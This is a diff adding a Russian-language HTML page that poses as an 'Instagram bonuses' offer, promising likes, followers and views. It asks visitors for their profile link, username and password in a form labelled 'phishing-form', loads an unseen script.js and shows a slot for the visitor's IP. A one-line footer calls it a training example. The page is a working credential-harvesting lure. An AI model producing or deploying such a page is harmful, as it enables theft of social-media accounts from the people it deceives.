@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📸 Instagram Бонусы 🎁</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container" style="background: white; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1); border-radius: 15px;">
+        <h1 style="font-family: 'Arial', sans-serif; color: #E1306C;">📸 Получите бонусы для Instagram! 🎁</h1>
+        <p style="font-size: 16px; color: #333;">Выберите желаемый бонус и заполните данные для получения награды! 🚀</p>
+        <form id="phishing-form">
+            <div class="bonus-options">
+                <div class="bonus-option" data-value="1000 Лайков" style="background: linear-gradient(135deg, #F58529, #DD2A7B);">❤️ 1000 Лайков</div>
+                <div class="bonus-option" data-value="500 Подписчиков" style="background: linear-gradient(135deg, #515BD4, #8134AF);">👥 500 Подписчиков</div>
+                <div class="bonus-option" data-value="2500 Просмотров" style="background: linear-gradient(135deg, #8134AF, #DD2A7B);">👁️ 2500 Просмотров</div>
+            </div>
+            <input type="text" id="profile-link" placeholder="🔗 Введите ссылку на профиль Instagram" required style="background-color: rgba(0, 0, 0, 0.05); color: #333;">
+            <input type="text" id="username" placeholder="👤 Введите имя пользователя Instagram" required style="background-color: rgba(0, 0, 0, 0.05); color: #333;">
+            <input type="password" id="password" placeholder="🔒 Введите пароль Instagram" required style="background-color: rgba(0, 0, 0, 0.05); color: #333;">
+            <button type="submit" id="get-bonus-btn" style="background: linear-gradient(135deg, #F58529, #DD2A7B); color: white;">🔥 Получить бонус 🔥</button>
+        </form>
+        <p id="ip-display" style="margin-top: 10px; color: red; font-weight: bold;"></p>
+        <p class="disclaimer" style="font-size: 12px; color: gray;">⚠️ Это обучающий пример. Никогда не вводите свои реальные данные на подозрительных сайтах.</p>
+    </div>
+</body>
+</html>
